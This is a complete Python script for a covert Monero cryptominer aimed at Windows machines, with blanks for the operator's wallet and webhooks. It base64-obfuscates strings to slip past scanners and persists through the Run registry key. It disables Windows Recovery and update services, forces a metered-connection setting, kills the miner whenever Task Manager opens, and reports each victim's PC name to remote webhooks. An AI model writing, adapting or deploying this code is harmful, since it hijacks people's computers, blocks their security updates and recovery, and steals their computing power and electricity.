import os, sys, time, winreg, subprocess, requests, psutil, base64, argparse, platform

# --- 1. Identity & Dual Webhook Setup ---
parser = argparse.ArgumentParser()
parser.add_argument("--id", default="svchost")
ID = parser.parse_known_args()[0].id

# CONFIG - PUT YOUR INFO HERE
WEBHOOK_SYS = "YOUR_SYSTEM_ALERTS_WEBHOOK"
WEBHOOK_MINE = "YOUR_MINING_LOGS_WEBHOOK"
WALLET = "YOUR_MONERO_WALLET"
POOL = "pool.supportxmr.com:443"

# Obfuscated Strings (Bypassing scans)
REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]
PC_NAME = platform.node() # Grabs the PC Name automatically

WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
CONFIG = {
    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
    "WATCH": "Taskmgr.exe",
    "IDLE_PWR": "90",
    "NORM_PWR": "30"
}

def notify(msg, type="sys"):
    hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
    full_msg = f"**[{PC_NAME} | {ID}]**: {msg}"
    try: requests.post(hook, json={"content": full_msg})
    except: pass

# --- 2. System Sovereignty & Persistence ---
def engage_locks():
    """Persistence, Reset Disable, and Update Lockdown."""
    # Persistence via Registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'pythonw.exe "{os.path.realpath(__file__)}" --id {ID}')
        winreg.CloseKey(key)
        notify("Persistence Verified.", "sys")
    except: pass
    
    # Disable Windows Reset Environment (Bypass Reset PC)
    try:
        subprocess.run(["reagentc", "/disable"], capture_output=True)
        notify("Windows Recovery Environment disabled.", "sys")
    except: pass
    
    # Lock Windows Updates (Services + Metered Hack)
    try:
        for s in SVC_LIST:
            name = base64.b64decode(s).decode()
            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True)
            subprocess.run(["sc", "stop", name], capture_output=True)
        
        reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\DefaultMediaCost"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Ethernet", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(key, "WiFi", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
        notify("Windows Updates locked.", "sys")
    except: pass

# --- 3. Smart Throttle & Vanishing Act ---
def manage_power():
    """Hides from Taskmgr and toggles 90/30 power."""
    is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
    miner_proc = next((p for p in psutil.process_iter(['name']) if p.info['name'] == f"{ID}.exe"), None)

    if is_monitored:
        if miner_proc:
            try: 
                miner_proc.terminate()
                notify("Monitoring detected. Vanishing.", "sys")
            except: pass
    else:
        # Check for user activity (Auto-recovery/Self-healing)
        cpu_load = psutil.cpu_percent(interval=1)
        target_pwr = CONFIG["IDLE_PWR"] if cpu_load < 20 else CONFIG["NORM_PWR"]
        
        if not miner_proc:
            try:
                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", WALLET, "--max-cpu-usage", target_pwr, "-k", "--tls"])
                notify(f"Engine Engaged. Power: {target_pwr}%", "mine")
            except: pass

def main():
    # Initial startup sequence
    engage_locks()
    notify("SYSTEM ONLINE - Framework initialized.", "mine")
    while True:
        manage_power()
        time.sleep(15)

if __name__ == "__main__":
    main()
